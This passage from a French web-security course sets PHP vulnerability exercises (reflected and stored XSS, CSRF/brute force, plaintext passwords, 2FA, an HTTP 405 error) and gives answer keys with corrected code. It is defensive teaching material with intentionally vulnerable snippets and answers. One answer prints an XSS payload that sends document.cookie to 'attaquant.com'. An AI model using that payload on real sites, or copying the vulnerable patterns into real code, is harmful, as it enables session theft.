    De plus, les entrées utilisateur ne sont pas assainies (risque XSS à la réaffichage).

    **Correction**

    ```php
    <?php
    if (isset($_POST['name']) && isset($_POST['email'])) {
        // Assainir les entrées
        $name  = htmlspecialchars(trim($_POST['name']), ENT_QUOTES, 'UTF-8');
        $email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);

        if ($email === false) {
            exit('Email invalide');
        }

        // Le placeholder ? ne doit PAS être entouré de guillemets
        $stmt = $pdo->prepare("INSERT INTO users (name, email) VALUES (?, ?)");
        $stmt->execute([$name, $email]);
    }
    ?>
    ```

    **Règle à retenir :** dans une requête préparée PDO, le `?` (ou `:param`) ne doit **jamais** être entre guillemets. C'est PDO qui gère l'échappement et le typage.

## Faille 9

Identifiez les failles de sécurité dans le code source suivant :

```php

<?php

echo "<h2>Bonjour $_GET['name']</h2>";

?>
```

L'utilisateur accède à la page avec l'URL suivante : `http://localhost:8000/index.php?name=John`

Proposez une solution pour corriger cette faille. Expliquez en quoi cette faille est dangereuse.

??? question "Éléments de correction"

    **Failles identifiées**

    1. **XSS réfléchie** : `$_GET['name']` est affiché directement dans la page sans aucun échappement. Un attaquant peut forger l'URL :
       ```
       ?name=<script>document.location='http://attaquant.com/?c='+document.cookie</script>
       ```
       Le script est exécuté dans le navigateur de la victime et peut voler ses cookies de session.

    2. **Absence de validation** : aucun contrôle sur la valeur du paramètre.

    **Pourquoi est-ce dangereux ?**

    - L'attaquant peut **voler la session** de l'utilisateur (cookie de session) et usurper son identité.
    - Il peut **rediriger** la victime vers un site de phishing.
    - Il peut **modifier l'apparence** de la page (defacement).
    - Le lien malveillant peut être diffusé par email, réseaux sociaux, et exploité sur n'importe quel visiteur.

    **Correction**

    ```php
    <?php
    // Échapper la valeur avant tout affichage
    $name = htmlspecialchars($_GET['name'] ?? '', ENT_QUOTES, 'UTF-8');
    echo "<h2>Bonjour $name</h2>";
    ?>
    ```

    **Bonus :** valider que le nom ne contient que des caractères attendus :
    ```php
    $name = preg_replace('/[^a-zA-ZÀ-ÿ\s\-]/', '', $_GET['name'] ?? '');
    $name = htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
    ```

## Faille 10

L'auditeur a trouvé une faille de type XSS Stockée. Il a réussi à afficher une boîte de dialogue sur le navigateur des personnes visitant le site.

Le code source ou la faille se trouve est le suivant :

Page affichant les commentaires :

```php
<?php
// Récupère les commentaires
$request = "SELECT * FROM comments";
$comments = $pdo->query($request)->fetchAll(PDO::FETCH_ASSOC);

// Ajout d'un commentaire
if (isset($_POST['content'])) {
    $content = $_POST['content'];
    $request = "INSERT INTO comments (content) VALUES (?)";
    $pdo->prepare($request)->execute([$content]);
}
?>

<div class="container">
    <h1>Exercice 10</h1>
    <p>Vous devez corriger la faille XSS Stockée</p>
    <p>Voici les commentaires :</p>
    <ul>
        <?php foreach ($comments as $comment): ?>
            <li><?= $comment['content'] ?></li>
        <?php endforeach; ?>
    </ul>
</div>

<!-- Ajout d'un commentaire -->
<form>
    <div class="form-group">
        <label for="content">Commentaire</label>
        <textarea class="form-control" id="content" name="content" rows="3"></textarea>
    </div>
    <button type="submit" class="btn btn-primary">Envoyer</button>
</form>
```

Proposez une solution pour corriger cette faille. Deux solutions sont possibles.

??? question "Éléments de correction"

    **Différence XSS réfléchie vs XSS stockée**

    | Type | Mécanisme | Impact |
    |---|---|---|
    | XSS réfléchie | Le script est dans l'URL, renvoyé immédiatement | Victime = utilisateur qui clique sur le lien |
    | **XSS stockée** | Le script est **sauvegardé en base** et renvoyé à tous les visiteurs | Victime = **tous** les visiteurs de la page |

    La XSS stockée est **plus dangereuse** car elle touche tous les utilisateurs sans qu'ils aient besoin de cliquer sur un lien suspect.

    **Solution 1 : échapper à l'affichage (recommandée)**

    Ne pas modifier ce qui est stocké en base ; échapper au moment de l'affichage :

    ```php
    <?php foreach ($comments as $comment): ?>
        <li><?= htmlspecialchars($comment['content'], ENT_QUOTES, 'UTF-8') ?></li>
    <?php endforeach; ?>
    ```

    **Solution 2 : assainir à l'insertion**

    Nettoyer le contenu avant de le stocker en base :

    ```php
    if (isset($_POST['content'])) {
        $content = htmlspecialchars(trim($_POST['content']), ENT_QUOTES, 'UTF-8');
        // ou : $content = strip_tags($_POST['content']);
        $stmt = $pdo->prepare("INSERT INTO comments (content) VALUES (?)");
        $stmt->execute([$content]);
    }
    ```

    **Quelle solution privilégier ?**

    La **Solution 1** (échapper à l'affichage) est préférable : elle préserve les données brutes en base (utile pour la modération) et garantit la protection même si des données anciennes non assainies existent déjà.

    Les deux solutions peuvent être **combinées** pour une défense en profondeur.

    **Remarque :** le formulaire doit aussi utiliser `method="post"` explicitement et un token CSRF.

## Faille 11

L'auditeur a trouvé dans votre code une faille de type Bruteforce / CSRF. Avec cette faille il est capable de rejouer une requête à l'infini sans aucune limite, il peut s'en servir pour bruteforcer un mot de passe par exemple.

Soit l'extrait de code suivant :

```html
<!-- Formulaire d'authentification -->
<form action="/login" method="post">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form>
```

```php
<?php

$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

// Vérification du mot de passe
$request = "SELECT * FROM users WHERE username = ?";
$pdo->prepare($request)->execute([$username]);
$user = $pdo->fetch(PDO::FETCH_ASSOC);

if ($user && password_verify($password, $user['password'])) {
    // Connexion réussie
    // …
}
```

L'auditeur vous indique que vous devez mettre en place en place un token afin d'éviter le rejeu de requête.

::: tip Protection CSRF / Token

Pour protéger votre application contre les attaques CSRF, vous devez ajouter un token CSRF dans le formulaire. Ce token doit être généré aléatoirement et doit être vérifié lors de l'accès à la page.

```php
// Vérifier le token
if (isset($_POST['token']) && $_POST['token'] === $_SESSION['token']) {
    // Nous avons consommé le token, nous pouvons le supprimer
    unset($_SESSION['token']);

    // Le token est valide, nous pouvons traiter la requête
    // ...
}

// Génère un token aléatoire
$_SESSION['token'] = uniqid();
```

Et dans le formulaire :

```html
<input type="hidden" name="token" value="<?= $_SESSION['token'] ?>">
```

:::

Proposez une solution pour corriger cette faille.

::: tip Rappel

Pour corriger cette faille, d'autres solutions sont possibles :

- Limiter le nombre de tentatives de connexion (par exemple 3 tentatives).
- Ajouter un token CSRF dans le formulaire. (voir faille 3)
- Ajouter un délai entre chaque tentative de connexion. (exemple : 1 seconde)

L'objectif est de limiter le nombre de tentatives de connexion. L'objectif est de ralentir l'attaque brute force.

:::

??? question "Éléments de correction"

    **Nature de la faille**

    Sans token CSRF ni limitation de tentatives, un attaquant peut rejouer la requête POST de connexion en boucle avec un outil automatisé (Hydra, Burp Suite…) pour tester des milliers de mots de passe (**brute force**). La requête est également rejouable par un tiers (CSRF).

    **Correction : token CSRF + limitation de tentatives**

    ```php
    <?php
    session_start();

    // Initialisation du compteur et du token
    if (!isset($_SESSION['tentatives']))  $_SESSION['tentatives'] = 0;
    if (!isset($_SESSION['token']))       $_SESSION['token'] = bin2hex(random_bytes(32));

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {

        // 1. Vérification du token CSRF
        if (!isset($_POST['token']) || !hash_equals($_SESSION['token'], $_POST['token'])) {
            exit('Token CSRF invalide');
        }
        // Invalider le token (usage unique) et en générer un nouveau
        $_SESSION['token'] = bin2hex(random_bytes(32));

        // 2. Limitation des tentatives
        if ($_SESSION['tentatives'] >= 3) {
            exit('Trop de tentatives. Réessayez plus tard.');
        }
        $_SESSION['tentatives']++;

        // 3. Délai anti-brute-force
        sleep(1);

        $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
        $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

        $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
        $stmt->execute([$username]);
        $user = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($user && password_verify($password, $user['password'])) {
            $_SESSION['tentatives'] = 0; // Réinitialiser en cas de succès
            // Connexion réussie…
        }
    }
    ?>

    <form action="/login" method="post">
        <input type="hidden" name="token" value="<?= $_SESSION['token'] ?>">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <input type="submit" value="Login">
    </form>
    ```

    **Points clés :**
    - `bin2hex(random_bytes(32))` génère un token cryptographiquement sûr (meilleur que `uniqid()`).
    - `hash_equals()` compare les tokens de manière sécurisée (résistant aux timing attacks).
    - Le token est **renouvelé après chaque soumission** (usage unique).

## Faille 12

L'auditeur a trouvé une faille de type défaut de sécurisation de votre application. En effet lors de l'audit il découvre les enregistrements suivants en base de données :

```
=> SELECT * FROM users;

+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | adminSuperMotDePasse             |
|  2 | user     | user                             |
|  3 | root     | root                             |
+----+----------+----------------------------------+
```

Est-ce que vous voyez la potentielle faille de sécurité ?

Le code de création d'un utilisateur est le suivant :

```php
<?php
// Création d'un utilisateur
$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

$request = "INSERT INTO users (username, password) VALUES (?, ?)";
$pdo->prepare($request)->execute([$username, $password]);

?>
```

```php
<?php
// Vérification du mot de passe
$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

$request = "SELECT * FROM users WHERE username = ?";
$pdo->prepare($request)->execute([$username]);

$user = $pdo->fetch(PDO::FETCH_ASSOC);

if ($user && $password === $user['password']) {
    // Connexion réussie
    // …
}
?>
```

Proposez une solution pour corriger cette faille.

::: details Documentation

Pour stocker un mot de passe, vous devez utiliser la fonction `password_hash()`.

```php
$password = password_hash($_POST['password'], PASSWORD_DEFAULT);
```

Pour vérifier un mot de passe, vous devez utiliser la fonction `password_verify()`.

```php
if (password_verify($_POST['password'], $user['password'])) {
    // Le mot de passe est valide
}
```

:::

??? question "Éléments de correction"

    **Faille identifiée**

    Les mots de passe sont stockés **en clair** dans la base de données. Si un attaquant accède à la base (via une injection SQL, une sauvegarde exposée, un accès non autorisé…), il obtient immédiatement tous les mots de passe. Des comptes comme `root`/`root` et `user`/`user` sont de plus trivialement faibles.

    **Correction : hachage des mots de passe**

    ```php
    <?php
    // Création d'un utilisateur — hacher le mot de passe avant stockage
    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
    $password = $_POST['password']; // Ne pas sanitize avant hash (peut altérer le mot de passe)

    // PASSWORD_DEFAULT utilise bcrypt — algorithme adaptatif recommandé
    $hash = password_hash($password, PASSWORD_DEFAULT);

    $stmt = $pdo->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
    $stmt->execute([$username, $hash]);
    ?>
    ```

    ```php
    <?php
    // Vérification du mot de passe
    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
    $password = $_POST['password'];

    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    // password_verify compare le mot de passe saisi avec le hash stocké
    if ($user && password_verify($password, $user['password'])) {
        // Connexion réussie
    }
    ?>
    ```

    **La base de données devrait ressembler à :**
    ```
    | admin | $2y$10$xK8J...hashed... |
    | user  | $2y$10$aB3C...hashed... |
    ```

    **Points clés :**
    - `password_hash()` utilise **bcrypt** par défaut (salage automatique + coût configurable).
    - Ne **jamais** comparer les mots de passe avec `===` — toujours utiliser `password_verify()`.
    - Ne pas `htmlspecialchars` ou `filter_input` le mot de passe **avant** de le hacher : cela pourrait le modifier et créer des problèmes de comparaison.

## Double authentification

L'auditeur a trouvé une faille de sécurité dans votre application. Il vous demande de mettre en place une double authentification pour renforcer la sécurité de votre application.

Il vous encourage à mettre en place une authentification à deux facteurs (2FA) de type matériel (une application mobile), pour cela il vous indique que vous pouvez utiliser le code de la librairie 2FAAuth. Celle-ci s'utilise de la manière suivante :

```php
$doubleAuth = new 2FAAuth("Nom de l'application");
$user = User::findByLogin($login, $password);
$doubleAuth->setUser($user);
$code = $_POST['code'] ?? null;

if($doubleAuth->isCodeValid($code)) {
    // L'utilisateur est authentifié
} else {
    // L'utilisateur doit saisir le code 2FA
}
```

Le code actuel de votre application est le suivant :

### Page de login

```html
<form action="/login" method="post">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form>
```

### Page de gestion de l'authentification

```php
<?php

// Page de gestion de l'authentification

$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

$user = User::findByLogin($username, $password);

if ($user) {
    header('Location: /dashboard');
} else {
    header('Location: /login');
}

die();
```

Proposez une solution pour mettre en place une double authentification dans votre application.

??? question "Éléments de correction"

    **Principe du 2FA**

    L'authentification à deux facteurs ajoute un second facteur de vérification **indépendant** du mot de passe. Même si le mot de passe est compromis, l'accès reste bloqué sans le second facteur (code TOTP généré par une application mobile comme Google Authenticator ou Authy).

    **Flux en deux étapes**

    1. L'utilisateur saisit identifiant + mot de passe → vérification classique.
    2. Si OK, l'utilisateur est invité à saisir le code 2FA → vérification du code TOTP.
    3. Si les deux sont valides → accès accordé.

    **Correction**

    Page de gestion de l'authentification (`login.php`) :

    ```php
    <?php
    session_start();

    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
    $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

    $user = User::findByLogin($username, $password);

    if ($user) {
        // Étape 1 réussie : stocker l'utilisateur en session (pas encore connecté)
        $_SESSION['pending_user_id'] = $user->id;
        // Rediriger vers la page de saisie du code 2FA
        header('Location: /login-2fa');
    } else {
        header('Location: /login?error=1');
    }
    die();
    ```

    Page de vérification du code 2FA (`login-2fa.php`) :

    ```php
    <?php
    session_start();

    // Vérifier que l'étape 1 a bien été franchie
    if (!isset($_SESSION['pending_user_id'])) {
        header('Location: /login');
        die();
    }

    $user = User::findById($_SESSION['pending_user_id']);

    $doubleAuth = new 2FAAuth("MonApplication");
    $doubleAuth->setUser($user);

    $code = filter_input(INPUT_POST, 'code', FILTER_SANITIZE_STRING);

    if ($doubleAuth->isCodeValid($code)) {
        // Authentification complète : créer la session définitive
        unset($_SESSION['pending_user_id']);
        $_SESSION['user_id'] = $user->id;
        header('Location: /dashboard');
    } else {
        header('Location: /login-2fa?error=1');
    }
    die();
    ```

    Formulaire de saisie du code 2FA :

    ```html
    <form action="/login-2fa" method="post">
        <p>Saisissez le code généré par votre application mobile :</p>
        <input type="text" name="code" placeholder="Code à 6 chiffres" maxlength="6">
        <button type="submit">Valider</button>
    </form>
    ```

    **Points clés :**
    - L'utilisateur n'est **pas** connecté entre l'étape 1 et l'étape 2 (`pending_user_id` ≠ `user_id`).
    - Le code TOTP est valable ~30 secondes et **ne peut pas être rejoué**.
    - En cas de perte de l'appareil, prévoir des codes de secours (backup codes).

## Appel d'API

Lors de la phase de développement Antonin rencontre des problèmes d'appels aux API :

```
405 Method Not Allowed
```

Il vous demande de l'aider à résoudre ce problème. Voici l'extrait du code source de l'appel à l'API :

Client : 

```js
fetch('https://api.example.com/data', {
    method: 'POST',
    headers: {
        'Content-Type': 'application
    },
    body: JSON.stringify({name: 'John Doe'})
});
```

Serveur :

```php
<?php
// Extrait du code du routeur
Route::get('/', 'HomeController@index');
Route::get('/about', 'HomeController@about');
Route::get('/contact', 'HomeController@contact');
Route::post('/contact', 'HomeController@envoyer');
Route::put('/data', 'DataController@ajouter');
Route::delete('/data', 'DataController@supprimer');
```

Expliquez à Antonin pourquoi il reçoit une erreur 405 et proposez une solution pour corriger ce problème.

??? question "Éléments de correction"

    **Explication de l'erreur 405 – Method Not Allowed**

    L'erreur **405** signifie que la route `/data` existe sur le serveur, mais pas pour la méthode HTTP utilisée.

    Dans le routeur, la route `/data` est définie uniquement pour :
    - `PUT /data` → `DataController@ajouter`
    - `DELETE /data` → `DataController@supprimer`

    Or, le client envoie une requête **POST** sur `/data`. Il n'existe pas de route `POST /data` → le serveur répond 405.

    **Solution**

    Selon l'intention d'Antonin, deux options :

    **Option 1 : modifier la méthode côté client** (si `PUT` est sémantiquement correct)

    ```js
    fetch('https://api.example.com/data', {
        method: 'PUT',  // Utiliser PUT comme défini dans le routeur
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({name: 'John Doe'})
    });
    ```

    **Option 2 : ajouter la route POST côté serveur** (si POST est sémantiquement correct)

    ```php
    // Ajouter la route manquante
    Route::post('/data', 'DataController@ajouter');
    ```

    **Rappel des méthodes HTTP et leur usage conventionnel :**

    | Méthode | Usage |
    |---|---|
    | GET | Lire une ressource |
    | POST | Créer une nouvelle ressource |
    | PUT / PATCH | Modifier une ressource existante |
    | DELETE | Supprimer une ressource |

    **Bonus :** le header `Content-Type` dans le code client est incomplet (`'application` sans `/json'`). La ligne correcte est :
    ```js
    'Content-Type': 'application/json'
    ```
